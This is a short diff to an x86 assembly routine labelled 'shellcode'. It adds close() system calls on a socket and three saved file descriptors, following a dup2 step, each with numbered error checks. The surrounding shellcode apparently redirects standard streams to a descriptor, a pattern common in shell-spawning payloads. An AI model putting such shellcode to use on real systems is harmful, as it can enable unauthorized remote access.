@@ -80,6 +80,38 @@ shellcode:
         movl    $30, %ebx       # step 70 - dup2(n, 2)
         cmpl    $0, %eax
         jl      erroutclose
+
+        # close(socket)
+        movl    $6, %eax
+        movl    24(%ebp), %ebx
+        int     $0x80
+        movl    $30, %ebx       # step 80
+        cmpl    $0, %eax
+        jl      erroutclose
+
+        # close(fd0)
+        movl    $6, %eax
+        movl    208(%ebp), %ebx
+        int     $0x80
+        movl    $30, %ebx       # step 90
+        cmpl    $0, %eax
+        jl      erroutclose
+
+        # close(fd1)
+        movl    $6, %eax
+        movl    212(%ebp), %ebx
+        int     $0x80
+        movl    $30, %ebx       # step 100
+        cmpl    $0, %eax
+        jl      erroutclose
+
+        # close(fd2)
+        movl    $6, %eax
+        movl    216(%ebp), %ebx
+        int     $0x80
+        movl    $30, %ebx       # step 110
+        cmpl    $0, %eax
+        jl      erroutclose
         
         movl    $255, %ebx
         # all done
